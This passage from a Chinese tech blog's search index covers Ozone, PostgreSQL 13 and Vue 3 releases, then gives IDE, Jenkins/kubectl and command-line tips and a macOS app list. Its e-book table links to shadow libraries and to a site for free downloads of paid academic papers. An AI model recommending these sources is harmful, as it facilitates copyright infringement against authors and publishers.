[https://jdk.java.net/16/release-notes](https://jdk.java.net/16/release-notes)\n\n\n","categories":["release"],"tags":["JDK","Java","release","ZGC","GitHub","Vector","Metaspace","Sealed","instanceof"]},{"title":"腾讯大数据团队主导Apache社区新一代分布式存储系统Ozone 1.0.0发布","url":"/release/ozone-1-0-0/","content":"\n近日，**由腾讯大数据团队主导的Ozone 1.0.0版本**在Apache Hadoop社区正式发布。经过2年多的社区持续开发和腾讯内部1000+节点的实际落地验证，Ozone 1.0.0已经具备了在大规模生产环境下实际部署的能力。\n\n![Ozone 架构图](https://up-img.yonghong.tech/pic/2020/09/27-12-14-zmBPv2-r6Zr5y.jpg)\n\n[Ozone](https://github.com/apache/hadoop-ozone) 是Apache Hadoop社区推出的新一代分布式存储系统，它的出现满足了大量小文件的存储问题，解决了Hadoop分布式文件系统在可扩展性上的缺陷。作为Hadoop生态圈的一款新的[对象存储](https://cloud.tencent.com/product/cos?from=10680)系统，能够支持百亿甚至千亿级文件规模的存储。\n\n<!-- more -->\n\n腾讯大数据团队Ozone项目负责人陈怡表示，作为大数据领域的领导厂商，腾讯是国内一线互联网公司中最早加入社区的，目前已经在Ozone项目上已经主导完成了集群网络拓扑感知的开发，以及数据写入Multi-Raft Pipeline功能的开发。同时，主导的StorageContainerManager(SCM) 高可用HA功能也正在开发中。\n\n以集群网络拓扑感知来说，在传统的大数据构架下，有了网络拓扑结构，计算引擎的调度器可以将任务调度到离数据最近的节点来获取“数据的局部性”。即便是新兴的计算存储分离构架，同样也需要集群网络拓扑信息，来保证数据的故障容错能力和高可用性。\n\n陈怡进一步介绍说，在Ozone 的Alpha 发布后，腾讯内部的大数据平台上线了Ozone生产集群，承接了一部分业务的数据存储。随着数据服务体量的增加，逐渐发现Ozone写入性能显现出了一定的波动和瓶颈。基于这个发现，腾讯Ozone项目组设计并开发了数据写入Multi-Raft Pipeline功能，显著的提升了Ozone的写入吞吐量和性能。\n\n此外，为了测试Ozone整体的稳定性和性能，作为部署应用的先锋小队，腾讯内部部署了一个1000个数据节点的集群。进行了长达几个月的稳定性和压力测试。期间团队遇到并解决了各种OOM、节点Crash、性能低于预期等问题。经过全面的优化之后，单集群1000个节点现已能长时间稳定运行，并且所有的数据都校验确认正确无误。\n\n除了1000个节点集群的测试，1.0.0版本还进行10亿个元数据对象的测试和优化，进一步解决长期困扰HDFS的大量小文件问题。目前Ozone 1.0.0能够轻松支持10亿个10KB小对象的写入，同时元数据节点内存使用不超过64GB。\n\n为了确保Ozone和Hive、Spark、Impala等计算框架的无缝对接，Ozone 1.0.0进行了和Hive LLAP、Spark以及Impala的集成测试。TPC-DS的测试表明，在100GB和1TB两种数据量大小下，Ozone总体比HDFS有3.5%的优势。\n\n经过不断的测试和优化，升级后的Ozone 1.0.0在版本功能上有了质的跨越。除了支持 Hadoop Compatible FileSystem、Hadoop 2.x以及 Hadoop3.x环境，Ozone 1.0.0还兼容Hadoop生态的Kerberos认证体系，支持数据的用户无感知加密存放和Ranger授权集成、GDPR “Right to Erasure”以及网络构架感知。\n\n未来，腾讯大数据将继续发挥自身技术优势和积累，在Ozone的基础上开发基于SCM的新一代高性能分布式文件系统，并持续推进Ozone在更多腾讯内外部业务的实践落地，部署更大规模的生产集群。同时，进一步拥抱开源，深度参与Hadoop社区，提高Ozone的可靠性、稳定性和性能，将其打造成新一代大数据文件和对象混合存储系统。\n\n除了在Ozone 项目上的贡献之外，近年来**腾讯大数据在开源领域的贡献正在逐步加速，目前已完成了大数据核心能力全开源。**同时，还结合实际业务场景推动开源技术加速落地，通过技术实践和创新持续回馈社区贡献开源。在Apache基金会的大数据项目上，腾讯已经为主流的Hadoop、Spark、Flink等项目贡献了大量的特性和patch。\n","categories":["release"],"tags":["release","Ozone","Apache","Apache社区","腾讯云","大数据","分布式","存储","分布式存储"]},{"title":"PostgresSQL 13 正式发布！","url":"/release/postgresql-13/","content":"\nPostgreSQL 全球开发组今天宣布PostgreSQL 13正式发布，作为世界上最先进的开源数据库，PostgresSQL 13是目前的最新版本。\n\nPostgreSQL 13 在索引和查找方面进行了重大改进，有利于大型数据库系统，同时包括索引的空间节省和性能提高，使用聚合或分区的查询时的更快响应，使用增强的统计信息时更优化的查询计划，以及很多其他改进。\n\n<!-- more -->\nPostgreSQL 13除了具有强烈要求的功能（如并行清理和增量排序）外，还为不同大小的负载提供了更好的数据管理体验。此版本针对日常管理进行了优化，为应用程序开发人员提供了更多便利，并增强了安全性。\n\n\"PostgreSQL 13展示了我们全球社区在增强世界上最先进的开源关系数据库功能方面的协作和奉献精神。\"，PostgreSQL核心团队成员Peter Eisentraut说， \"每个发行版所带来的创新以及其在可靠性和稳定性方面的声誉，这是为什么越来越多的人选择在其应用程序中使用PostgreSQL的原因\"。\n\nPostgreSQL是一种创新的数据管理系统，以其可靠性和健壮性著称，得益于全球开发者社区 超过25年的开源开发，它已成为各种规模组织首选的开源关系型数据库。\n\n### 持续的性能提升\n\n在先前PostgreSQL版本的基础上，PostgreSQL 13可以有效地处理标准数据库索引B-tree中的重复数据。这降低了B-tree索引所需的总体使用空间，同时提高了整体查询性能。\n\nPostgreSQL 13引入了增量排序，其中查询中来自较早步骤的已排序数据可以加快后续步骤的排序。此外，PostgreSQL现在可以使用扩展的统计信息（通过CREATE STATISTICS访问）来创建增强带有OR子句和列表中的IN/ANY查找的查询计划。\n\n在PostgreSQL 13中，更多类型的聚合和分组可以利用PostgreSQL的高效哈希聚合功能，因为具有大聚合的查询不必完全放在内存中。带有分区表的查询性能得到了提高，因为现在有更多情况可以修剪分区并且可以直接连接分区。\n\n### 管理优化\n\n清理(Vacuuming)是PostgreSQL管理的重要部分，它使数据库能够在更新和删除行之后回收存储空间。尽管之前的PostgreSQL版本已经完成了减轻清理开销的工作，但是清理过程也可能带来管理上的挑战。\n\nPostgreSQL 13通过引入索引的并行清理来继续改进清理系统。除了它提供的清理性能优势外，由于管理员可以选择要运行的并行Worker进程的数量，因此可以针对特定工作负载调整此新功能的使用。除了这些性能带来的好处之外，数据插入现在还可以触发自动清理过程。\n\n复制槽(Replication slots)用于防止预写日志（WAL）在备库收到之前被删除，可以在PostgreSQL 13中进行调整以指定要保留的WAL文件的最大数量，并有助于避免磁盘空间不足的错误。\nPostgreSQL 13还增加了更多管理员可以监视数据库活动的方式，包括从EXPLAIN查看WAL使用情况的统计信息，基于流的备份进度，以及ANALYZE命令的进度。另外，还可以使用新的pg_verifybackup命令来检查pg_basebackup命令输出的完整性。\n\n### 便利的应用程序开发\n\nPostgreSQL 13让使用来自不同数据源的PostgreSQL数据类型更加容易。此版本在SQL/JSON路径支持中添加了datetime()函数，该函数将有效的时间格式（例如ISO 8601字符串）转换为PostgreSQL本地类型。此外，UUID v4 生成函数gen_random_uuid()现在可以直接使用而无需安装任何扩展。\nPostgreSQL的分区系统更加灵活，因为分区表完全支持逻辑复制和BEFORE行级触发器。\n\nPostgreSQL 13中的FETCH FIRST语法现已扩展为可包含WITH TIES子句。指定时，WITH TIES包括基于ORDER BY子句的结果集中最后一行相匹配的任何其他行。\n\n### 安全增强\n\nPostgreSQL的扩展系统是其强大功能的关键组成部分，因为它允许开发人员扩展其功能。在以前的版本中，新的扩展只能由数据库超级用户安装。为了更轻松地利用PostgreSQL的可扩展性，PostgreSQL 13添加了\"可信扩展\"的概念，该概念允许数据库用户使用安装超级用户标记为\"受信任\"的扩展。某些内置扩展默认情况下标记为受信任，包括 pgcrypto， tablefunc， hstore等。\n\n对于需要安全身份验证方法的应用程序，PostgreSQL 13允许客户端在使用SCRAM身份验证时要求通道绑定，并且PostgreSQL外部数据包装器(postgres_fdw)现在可以使用基于证书的身份验证。\n\n### 关于PostgreSQL\n\nPostgreSQL是世界上最先进的开源数据库，它的全球社区是一个由成千上万的用户、开发人员、公司或其他组织组成的。PostgreSQL起源于加利福尼亚大学伯克利分校，已经有30多年的历史，并且以无与伦比的开发速度继续发展。PostgreSQL的成熟功能不仅与顶级商业数据库系统匹配，而且在高级数据库功能、可扩展性、安全性和稳定性方面超过了它们。\n\n### 相关链接\n\n- [PostgreSQL 13 Released!](https://www.postgresql.org/about/news/2077/)\n- [PostgreSQL 13 正式发布](http://www.postgres.cn/v2/news/viewone/1/637)","categories":["release"],"tags":["release","PostgresSQL"]},{"title":"Vue 3 One Piece 正式发布！","url":"/release/vue-3/","content":"\nVue.js 3.0 \"One Piece\" 已正式发布，此框架新的主要版本提供了更好的性能、更小的捆绑包体积、更好的 TypeScript 集成、用于处理大规模用例的新 API，并为框架未来的长期迭代奠定了坚实的基础。\n\n3.0 版本的开发周期长达两年多，期间产生了 [30+ RFCs](https://github.com/vuejs/rfcs/tree/master/active-rfcs)、[2600+ commits](https://github.com/vuejs/vue-next/commits/master)、[628 pull requests](https://github.com/vuejs/vue-next/pulls?q=is%3Apr+is%3Amerged+-author%3Aapp%2Fdependabot-preview+)，以及核心仓库之外的大量开发和文档工作。\n\nVue 3.0 的发布标志着此框架整体上已处于可用状态。尽管框架的某些子项目可能仍需要进一步的开发才能达到稳定状态（特别是 devtools 中的路由和 Vuex 集成），不过现在仍然是开始使用 Vue 3 启动新项目的合适时机。官方还鼓励库作者现在可以开始升级项目以支持 Vue 3。查阅[《Vue 3 Libraries Guide》](https://v3.vuejs.org/guide/migration/introduction.html#supporting-libraries)以获取有关所有框架子项目的详细信息。\n\n<!-- more -->\n\n## 分层内部模块 (Layered internal modules)\n\nVue 3.0 core 仍然可以通过`<script>`标签进行使用，但其内部架构已被彻底重写为[一组解耦的模块](https://github.com/vuejs/vue-next/tree/master/packages)。新架构提供了更好的可维护性，并允许使用者通过 tree-shaking 来减少多达一半的 runtime 大小。\n\n这些模块还将许多底层 API 暴露出来，可用于许多高级用例：\n\n- 编译器为定制 build-time 提供了对自定义 AST 转换的支持（例如 [build-time i18n](https://github.com/intlify/vue-i18n-extensions)）\n- 内核 runtime 提供了优先级最高的 API，用于创建针对不同渲染目标（例如[原生移动设备](https://github.com/rigor789/nativescript-vue-next)、[WebGL](https://github.com/Planning-nl/vugel) 或[终端](https://github.com/ycmjason/vuminal)）的自定义渲染器。默认 DOM 渲染器使用相同的 API 构建\n- [`@vue/reactivity`模块](https://github.com/vuejs/vue-next/tree/master/packages/reactivity)导出的函数可以直接访问 Vue 的 reactivity 系统，其本身也可以作为一个独立的程序包使用。它还可以与其他模板解决方案（例如 [vue-lit](https://github.com/yyx990803/vue-lit)）搭配使用，甚至可以在非 UI 场景中使用\n\n## 用于处理大规模用例的新 API\n\n在 Vue 3 中，基于对象的 2.x API 基本没有变化。不过 3.0 还引入了 [Composition API](https://v3.vuejs.org/guide/composition-api-introduction.html)，旨在解决 Vue 在大型应用程序中的使用痛点。Composition API 构建于 reactivity API 之上，可以实现类似于 React 钩子(React hooks)的逻辑组合和重用，与 2.x 基于对象的 API 相比，拥有更灵活的代码组织模式和更可靠的类型推导。\n\n通过 [@vue/composition-api](https://github.com/vuejs/composition-api) 插件，Composition API 还可以与 Vue 2.x 搭配使用，并且目前已经有适用于 Vue 2 和 3 的 Composition API 实用程序库（例如 [vueuse](https://github.com/antfu/vueuse)，[vue-composable](https://github.com/pikax/vue-composable)）。\n\n## 提升性能\n\n与 Vue 2 相比，Vue 3 在捆绑包体积（通过 tree-shaking 减小约 41% 大小）、初始渲染（速度提升约 55%）、更新（速度提升约 133%）和内存使用率（降低约 54%）等方面有了[显著的性能提升](https://docs.google.com/spreadsheets/d/1VJFx-kQ4KjJmnpDXIEaig-cVAAJtpIGLZNbv3Lr4CR0/edit?usp=sharing)。\n\nVue 3 采用了\"compiler-informed Virtual DOM\"的方法：模板编译器执行激进的优化并生成渲染函数代码，以提升静态内容访问速度，为绑定类型留下 runtime 提示。最重要的是，将内部的动态节点扁平化处理，以降低 runtime 遍历的成本。因此，用户可以获得两全其美的效果：通过模板优化编译器的性能，或者在用例需要时通过手动渲染函数直接控制。\n\n## 改进与 TypeScript 的集成\n\nVue 3 使用 TypeScript 编写，具有自动生成、测试和捆绑的类型定义等特性。Composition API 可与类型推导很好地搭配使用。Vetur，Vue 3 的官方 VSCode 扩展，现在支持模板表达式，以及利用 Vue 3 改进的内部类型进行 props 类型检查。\n\n## 实验性功能\n\n为单文件组件(SFC, Singe-File Components)，即 .vue 文件提供了两项新特性：\n\n- [: 用于在 SFC 中使用 Composition API 的语法糖](https://github.com/vuejs/rfcs/blob/sfc-improvements/active-rfcs/0000-sfc-script-setup.md)\n- [: SFC 中状态驱动的 CSS 变量](https://github.com/vuejs/rfcs/blob/sfc-improvements/active-rfcs/0000-sfc-style-variables.md)\n\n上述已在 Vue 3.0 中实现并可用，但仅出于收集反馈的目的而提供。在合并 RFC 之前，它们将保持实验性状态。\n\n此外还实现了一个当前未记录的`<Suspense>`组件，该组件允许在初始渲染或分支切换时等待嵌套的异步依赖项（异步组件或包含`async setup()`的组件）。目前正在与 Nuxt.js 团队一起测试和迭代此功能（[即将在 Nuxt 3发布](https://nuxtjs.slides.com/atinux/state-of-nuxt-2020)），并且可能会在 3.1 中到达稳定。\n\n## 下一步\n\n发布后的短期内，开发团队将专注于：\n\n- 版本迁移\n- 支持 IE11\n- 新 devtools 中的路由和 Vuex 集成\n- 对 Vetur 中模板类型推导的进一步改进\n\n目前，Vue 3 和 v3-targeting 项目的文档网站、GitHub 分支和 npm dist 标签将保持 next-denoted 状态。这意味着使用`npm install vue`命令仍会安装 Vue 2.x，而要安装 Vue 3 需使用`npm install vue@next`命令。官方计划在 2020 年底前将所有的 doc 链接、分支和 dist 标签都切换为默认 3.0。\n\n同时，团队已开始启动 2.7 的开发工作计划，这将是 2.x 的最后一个次要版本。2.7 将向后移植来自 v3 的兼容改进，并会提示有关 v3 中已删除/更改的 API 使用情况的警告。团队表示计划在 2021 年第一季度开发 2.7，发布后将直接变为 LTS 版本，具有 18 个月的维护周期。\n\n## 使用\n\n了解有关 Vue 3.0 的更多信息，访问[新文档网站](https://v3.vuejs.org/)。如果是 Vue 2.x 用户，访问[迁移指南](https://v3.vuejs.org/guide/migration/introduction.html)。\n\n详情查看 https://github.com/vuejs/vue-next/releases/tag/v3.0.0","categories":["release"],"tags":["release","Vue","Vue3","One Piece"]},{"title":"Android Studio 技巧","url":"/tips/android-studio/","content":"\n### Local Changes 标签页\n\n\n打开 Preferences/Version Control/Commit ，将 Use non-modal commit interface 选项 取消勾选 即可。\n\n<!-- more -->\n\n### 日期格式调整\n\n打开 Preferences/Appearacnce & Behavior/System Settings/Date Formats，将日期格式设置为 yyyy/MM/dd ","categories":["技巧"],"tags":["Android Studio","Android","技巧"]},{"title":"速查","url":"/tips/cheat-sheet/","content":"\n\n## 命令速查\n\n### adb\n\n- 安装\n    ```bash\n    adb -s device-name install demo.apk\n    ```\n- 获取手机属性\n    ```bash\n    adb -s device-name shell getprop\n    ```\n- 获取手机model\n    ```bash\n    adb -s device-name shell getprop | grep product\n    ```\n- 设置代理\n    ```bash\n    adb shell settings put global http_proxy ip:port\n    adb shell settings put global https_proxy ip:port\n    ```\n- 清除代理\n    ```bash\n    adb shell settings put global http_proxy :0\n    adb shell settings put global https_proxy :0\n    ```\n\n<!-- more -->\n\n### ffmpeg \n\n- 转码\n    ```bash\n    ffmpeg -i input.mp4 -profile:v baseline -level 3.0 output.mp4\n    ```\n- 视频按帧转图片\n    ```bash\n    ffmpeg -i input.mp4 -f image2 test/%05d.jpeg\n    ```\n\n### ffprobe\n\n- 查看视频格式\n    ```bash\n    ffprobe input.mp4 -show_streams -show_format -v quiet\n    ```\n\n### gradle\n\n- 生成 gradlew\n    ```bash\n    gradle wrapper\n    ```\n- gradlew 修改版本\n    ```bash\n    ./gradlew wrapper --gradle-version 7.2\n    ```\n- gradlew 执行\n    ```bash\n    ./gradlew :ModuleName:taskName\n    ```\n\n### git\n\n- git 浅克隆\n    ```bash\n    git clone -b branchName remote-url --single-branch\n    ```\n- git clone 只clone一个分支，并且还能checkout远端分支\n    ```bash\n    git clone --filter=blob:none --no-checkout\n    ```\n- git 彻底删除 .gitignore 中文件\n    ```bash\n    git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch file.txt' --prune-empty --tag-name-filter cat -- --all\n    git filter-branch --force --index-filter 'git rm -r --cached --ignore-unmatch file_dir' --prune-empty --tag-name-filter cat -- --all\n    ```\n\n## Android 版本号\n\n| 名称                 | 版本号       | 发行日期       | API等级  |  安全性更新状态 |\n| ------------------- | ----------- | ------------- | ------- | ------------- |\n| Android Jelly Bean  | 4.1 – 4.3.1 | 2012年7月9日   | 16 – 18 | 不支持         |\n| Android KitKat      | 4.4 – 4.4.4 | 2013年10月31日 | 19 – 20 | 不支持         |\n| Android Lollipop    | 5.0 – 5.1.1 | 2014年11月12日 | 21 – 22 | 不支持         |\n| Android Marshmallow | 6.0 – 6.0.1 | 2015年10月5日  | 23      | 不支持         |\n| Android Nougat      | 7.0 – 7.1.2 | 2016年8月22日  | 24 – 25 | 不支持         |\n| Android Oreo        | 8.0 – 8.1   | 2017年8月21日  | 26 – 27 | 支持           |\n| Android Pie         | 9           | 2018年8月6日   | 28      | 支持           |\n| Android 10          | 10          | 2019年9月3日   | 29      | 支持           |\n| Android 11          | 11          | 2020年9月8日   | 30      | 支持           |\n| Android 12          | 12          | 2021年10月4日  | 31      | 支持           |\n\n\n","categories":["技巧"],"tags":["技巧","速查"]},{"title":"IDEA 技巧","url":"/tips/idea/","content":"\n## properties 文件 Unicode 转中文\n\n- Preference -> Editor -> File Encodings -> Properties Files (*.properties) \n- 勾选上 Transparent native-to-ascii conversion\n\n## 调整 import 多个类时不变成 import *\n\n- Preference -> Editor -> Code Style -> Java -> Imports \n- Class count to use import with \"*\"\n- Names count to use static import with \"*\"\n- 这两个数值调大到 999\n\n<!-- more -->\n\n## 关闭XML中SQL的黄色背景\n\n- Preference -> Editor -> Inspections -> SQL \n- 取消勾选 No data sources configured 和 SQL dialect detection\n\n![pic](https://up-img.yonghong.tech/pic/2021/08/03-15-20-xhH8ST-vf3mKv.jpg)\n\n## 格式化代码\n\n- 格式化整个文件，⌘ + ⌥ + L\n- 格式化选中区域，选中指定区域后，⌘ + ⌥ + L\n\n## 补全方法调用的返回值\n\n光标放在调用的方法名上，⌘ + ⌥ + V \n\n","categories":["技巧"],"tags":["技巧","IDEA"]},{"title":"Jenkins 常用插件、配置","url":"/tips/jenkins/","content":"\n### 0.更新国内镜像\n\n系统管理 -> 插件管理 -> 高级 ->升级站点\n\n[https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json](https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json)\n\n这个链接中只是索引插件，但里面的下载地址仍然指向 updates.jenkins-ci.org ，所以通过改host+nginx反代的方式欺骗Jenkins去清华源下载\n\n### 1.中文插件 Localization: Chinese (Simplified)\n\nJenkins Core 及其插件的简体中文语言包，由 [Jenkins 中文社区](https://jenkins-zh.cn/about) 维护。\n\n<!--more-->\n\n[https://www.jenkins.io/sigs/chinese-localization/](https://www.jenkins.io/sigs/chinese-localization/)\n\n![截屏2020-05-14下午1.28.34](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-14%20下午1.28.34.png)\n\n### 2.参数化构建\n\n这个网上都说要安装两个插件，但是我自己试了一下没有安装这两个插件也有这个功能。\n\n```\nBuild With Parameters 输入框式的参数\nPersistent Parameter  下拉框式的参数\n```\n\n但是由于中文插件的问题，所以显示可能是中文也可能是英文。\n\n![截屏2020-05-14下午1.17.01](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-14%20下午1.17.01.png)\n\n![截屏2020-05-14下午1.15.59](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-14%20下午1.15.59.png)\n\n### 3.rebuild\n\n使用上次的参数重新构建，安装完这个插件后，项目左侧的按钮中会多一个【rebuild last】的选项，点击就可以重新构建而不用重新填写参数了。\n\n![19-17-40-截屏2020-05-19下午5.40.03-TGmsh6](https://up-img.yonghong.tech/pic/2020/05/19-17-40-截屏2020-05-19%20下午5.40.03-TGmsh6.png)\n\n![19-17-40-截屏2020-05-19下午5.40.12-sb4B9v](https://up-img.yonghong.tech/pic/2020/05/19-17-40-截屏2020-05-19%20下午5.40.12-sb4B9v.png)\n\n\n### 4.node版本控制\n\n系统管理->全局工具配置->NodeJS\n\n可选 nodejs 版本，位数（Force 32bit architecture），可以预装一些工具（yarn 等），设置全局 npm 刷新时间，建议设置稍长一些，不然没过几天就会刷新一次，耗时长（Global npm packages refresh hours）\n\n![截屏2020-05-14下午1.46.54](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-14%20下午1.46.54.png)\n\n配置好之后就可以在项目中使用了\n\n![截屏2020-05-14下午1.50.30](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-14%20下午1.50.30.png)\n\n### 5.自动部署到k8s\n\n自动部署到k8s需要Jenkins主机上安装了 Docker, kubectl 工具\n\n还需要安装插件 [Kubernetes CLI Plugin](https://plugins.jenkins.io/kubernetes-cli/)\n\n![5LnHZa](https://up-img.yonghong.tech/pic/2020/05/5LnHZa.jpg)\n\n可以参考 GitHub readme 添加凭据\n\n{% raw %}\n```shell\n# Create a ServiceAccount named `jenkins-robot` in a given namespace.\n$ kubectl -n <namespace> create serviceaccount jenkins-robot\n\n# The next line gives `jenkins-robot` administator permissions for this namespace.\n# * You can make it an admin over all namespaces by creating a `ClusterRoleBinding` instead of a `RoleBinding`.\n# * You can also give it different permissions by binding it to a different `(Cluster)Role`.\n$ kubectl -n <namespace> create rolebinding jenkins-robot-binding --clusterrole=cluster-admin --serviceaccount=<namespace>:jenkins-robot\n\n# Get the name of the token that was automatically generated for the ServiceAccount `jenkins-robot`.\n$ kubectl -n <namespace> get serviceaccount jenkins-robot -o go-template --template='{{range .secrets}}{{.name}}{{\"\\n\"}}{{end}}'\njenkins-robot-token-d6d8z\n\n# Retrieve the token and decode it using base64.\n$ kubectl -n <namespace> get secrets jenkins-robot-token-d6d8z -o go-template --template '{{index .data \"token\"}}' | base64 -d\neyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2V[...]\n```\n{% endraw %}\n\n[https://github.com/jenkinsci/kubernetes-cli-plugin/blob/master/README.md#using-the-plugin-from-the-web-interface](https://github.com/jenkinsci/kubernetes-cli-plugin/blob/master/README.md#using-the-plugin-from-the-web-interface)\n\n[https://github.com/jenkinsci/kubernetes-cli-plugin/blob/master/README.md#generating-kubernetes-credentials](https://github.com/jenkinsci/kubernetes-cli-plugin/blob/master/README.md#generating-kubernetes-credentials)\n\n完成上述操作后就可以在执行shell脚本中使用 kubectl 命令了","categories":["技巧"],"tags":["Jenkins","插件","自动化","k8s","Kubernates","汉化","NodeJs","参数化"]},{"title":"macOS 装机清单","url":"/tips/mac-install-list/","content":"\n### 输入法\n\n搜狗输入法：https://pinyin.sogou.com/mac/\n\n### iTerm2\n\nhttps://iterm2.com/\n\n<!-- more -->\n\n### omyzsh\n\nhttps://ohmyz.sh/\n\n### homebrew\n\nhttps://brew.sh/\n\n### JDK\n\njenv：\n\n```\nbrew install openjdk@8\nbrew install openjdk@11\n\n/usr/libexec/java_home -V\n```\n\n### nodejs\n\nnvm：\n\n### 浏览器\n\nEdge：https://www.microsoft.com/zh-cn/edge\n\nChrome：https://www.google.com/chrome/\n\n### 聊天/办公工具\n\n微信：https://weixin.qq.com/\n\n企业微信：https://work.weixin.qq.com/\n\n钉钉：https://www.dingtalk.com/\n\n飞书：https://www.feishu.cn/\n\n腾讯会议：https://meeting.tencent.com/\n\noffice：https://next.itellyou.cn/\n\n### 解压工具\n\nkeka：https://www.keka.io/en/\n\nThe Unarchiver：https://theunarchiver.com/\n\n### 系统工具\n\n腾讯柠檬：https://lemon.qq.com/\n\n防息屏 Sleep Control Center：App Store\n\n### 开发工具\n\nJetBrains Toolbox：https://www.jetbrains.com/toolbox-app/\n\nvscode：https://code.visualstudio.com/\n\npostman：https://www.postman.com/\n\nSwitchHosts：https://github.com/oldj/SwitchHosts/releases\n\n### Markdown\n\nTypora：https://typora.io/\n\n### 画图\n\ndrawio：https://github.com/jgraph/drawio-desktop/releases\n","categories":["技巧"],"tags":["技巧","macOS"]},{"title":"如果你在以下网站还找不到书的话，就还是花钱买吧","url":"/tips/search-book/","content":"\n| 网站 | 链接 |\n| --- | --- |\n| Z-Library | https://1lib.education |\n| LoreFree | https://ebook2.lorefree.com |\n| 鸠摩搜索 | https://www.jiumodiary.com |\n| 熊猫搜书 | https://ebook.blinkol.com |\n| 搬书匠 计算机类图书 | http://www.banshujiang.cn |\n| Java知识分享网 计算机类图书 | http://www.java1234.com |\n| 码农之家 计算机类图书 | https://www.xz577.com |\n| 布客新知 计算机类图书 | https://github.com/ixinzhi|\n| free-programming-books Free Ebook Foundation的免费计算机类图书 | https://github.com/EbookFoundation/free-programming-books |\n| 免费编程中文书籍索引 | https://github.com/justjavac/free-programming-books-zh_CN |\n| 编程随想的电子书清单 | https://github.com/programthink/books |\n| SaltTiger 最新出版的技术类英文原版书 | https://salttiger.com |\n| IT图书 计算机类图书 | https://itboook.com |\n| SoBooks | https://sobooks.cc |\n| Aibooks.cc | https://www.aibooks.cc |\n| 相识电子书 | http://www.xiangshi123.com |\n| 知识库 | https://book.zhishikoo.com |\n| 书单网 | https://www.shudan.vip |\n| 苦瓜书盘 | https://www.kgbook.com |\n| 掌上书苑 | https://www.soepub.com |\n| 知轩藏书 | http://www.zxcs.me |\n| 点点文库 | https://www.torrent.org.cn/bd |\n| 淘链客 | http://www.toplinks.cc/s |\n| 库问搜索 | http://www.koovin.com |\n| owllook 垂直小说搜索引擎 | https://www.owlook.com.cn |\n| 中国哲学书电子化计划 | https://ctext.org/zhs |\n| 书格 | https://new.shuge.org |\n| 古籍网 | http://bookinlife.net |\n| 古籍馆 | https://www.gujiguan.com |\n| 中国国家数字图书馆 | http://find.nlc.cn |\n| 臺灣大學圖書館 | http://ntu.primo.exlibrisgroup.com |\n| 科学文库 科学出版社免费教程，下载需要教育网IP | https://book.sciencereading.cn |\n| 高教书苑 高教出版社免费教程 | https://ebook.hep.com.cn/ebooks/index.html |\n| 晨曦科技团队数字图书馆 知网/万方/维普资源免费下载 | https://www.readersteam.com |\n| 互助联盟 全国图书馆参考咨询联盟书籍互助查询 | https://www.readersteam.com |\n| 全国图书馆参考咨询联盟 配合 图书互助 油猴脚本，可低价购买PDF文档 | http://www.ucdrs.superlib.net |\n| 国家中小学网络云平台 教育部提供的免费名师网课，涵盖小学初中高中 | https://ykt.eduyun.cn |\n| 北京大学出版社 北京大学出版社第六事业部免费教程 | https://pup6.yunzhan365.com |\n| PDF之家 PDF图书下载 | http://pdfzj.cn |\n| 雅书 PDF图书下载 | https://yabook.org |\n| pdf资源网 | http://pdf.018zy.com |\n| 书行天下 PDF图书下载，搜索功能难用 | https://www.sxpdf.com |\n| 爱悦读网 Kindle图书 | https://www.iyd.wang |\n| 千秋书在 | https://www.qqszz.com |\n| 读书达人 | http://www.dushudaren.com |\n| 琳宝书屋 | https://linbaoshuwu.com |\n| 阅读链 | https://www.yuedu.pro |\n| Aibooks.club | https://www.aibooks.club |\n| 偶书 | https://obook.cc |\n| 芒果读书 | http://diumx.com |\n| 书单 | https://ebooklist.mobi |\n| 519资源网 | https://www.519.best |\n| 78书库 | http://www.78books.com |\n| 好读 | http://haodoo.net |\n| Vol.moe Kindle漫画下载及在线观看 | https://vol.moe |\n| 推书 | http://www.tuiliw.com |\n| 蓝文资源库 | https://www.bluestep.cc/books |\n| 西东网 | http://xidong.net |\n| 静思书屋 | https://book.tinynews.org |\n| Kindle吧 | https://www.kindle8.cc |\n| 三无书舍 | https://swpdf.com |\n| ebook22 | http://ebook22.com |\n| 书行万里 | https://www.gpdf.net |\n| 精品下载站 PDF图书 | http://www.j9p.com/class/r\\_16\\_1.html |\n| 脚本之家 计算机类图书 | https://www.jb51.net/books |\n| 看医学 医学类电子书 | http://www.kanyixue.com |\n| 心情网 心理学图书在线观看 | http://www.ixinqing.com |\n| 我爱电子书 | https://www.52doc.com |\n| 精品电子书 | https://dylanbai8.github.io/ideahub |\n| 可可观察 | http://book.cocotao.cn |\n| 我爱书籍 下载文件以网盘文件夹形式提供 | http://www.52book.me |\n| 七里香 | http://lxqnsys.com/pdf |\n| Pdfdrive | https://www.pdfdrive.com/ |\n| 阿里云搜索 | http://aliyunshare.cn:8000/t/book |\n| 个人云盘 | https://od.gotoxi.com/sun_1tb_fun/Books/ |\n| 66books | http://www.66books.cn/|\n| Zure | https://zure.fun/|\n| Aibook| https://www.aibooks.club/|\n| Enjing| https://www.enjing.com/|\n| Ebook| https://www.ebookcn.com/|","categories":["技巧"],"tags":["技巧","搜书","电子书"]},{"title":"ARPU 是什么？ ARPPU 是什么？累计 ARPU 是什么？","url":"//wiki/arpu-and-arppu/","content":"\n## ARPU 每用户平均收入或平均每用户收入\n\nARPU: the Average Revenue Per User \n\n> **ARPU = 应用收益 / 应用活跃用户**\n\nARPU 这个指标计算的是某时间段内平均每个活跃用户为应用创造的收入。\n\nARPU 的计算中，所有的用户都被纳入了计算范围——无论是付费用户或非付费用户。ARPU 是评估应用变现有效性的指标：ARPU 越高，就代表用户在这段时间内为应用带来的变现收入就越多。 \n\nARPU可用于评估应用中的变动是否能有效提升变现收益：如果ARPU提升，证明应用的变动有利于提升应用变现收益；如果ARPU不升反降，应用开发者可能就需要确认一下变动的有效性了。\n\n## ARPPU 每付费用户平均收益\n\nARPPU: the Average Revenue Per Paying User\n\n> **ARPPU = 应用收益 / 应用付费用户**\n\n由于分母上数值较小（付费用户<全体活跃用户），对于同一时间的同一应用而言，ARPPU的数值会明显高于ARPU。\n\nARPPU 